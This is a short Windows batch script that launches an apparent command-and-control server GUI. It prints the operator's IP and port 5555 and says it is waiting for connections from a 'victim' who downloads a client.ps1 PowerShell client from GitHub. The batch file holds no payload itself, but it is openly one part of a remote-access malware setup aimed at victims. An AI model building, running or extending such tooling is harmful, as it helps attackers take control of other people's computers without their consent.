@echo off
color 0A
cls
echo.
echo ================================================
echo   STARTING CONTROL SERVER (GITHUB MODE)
echo ================================================
echo.
echo Your IP: 192.168.8.158
echo Control Port: 5555
echo.
echo MODE: GitHub (No web server needed!)
echo Victim downloads from: GitHub repository
echo.
echo ================================================
echo.

REM Get the directory where this bat file is located
set SCRIPT_DIR=%~dp0

echo Starting Control Server GUI...
echo.
echo ================================================
echo   GUI LAUNCHING
echo ================================================
echo.
echo Waiting for connections from victim...
echo.
echo Note: Victim will download client.ps1 from GitHub
echo No web server needed on your PC!
echo.
echo ================================================
echo.

REM Start GUI
python "%SCRIPT_DIR%server_professional.py"

echo.
echo Server stopped.
timeout /t 2 >nul
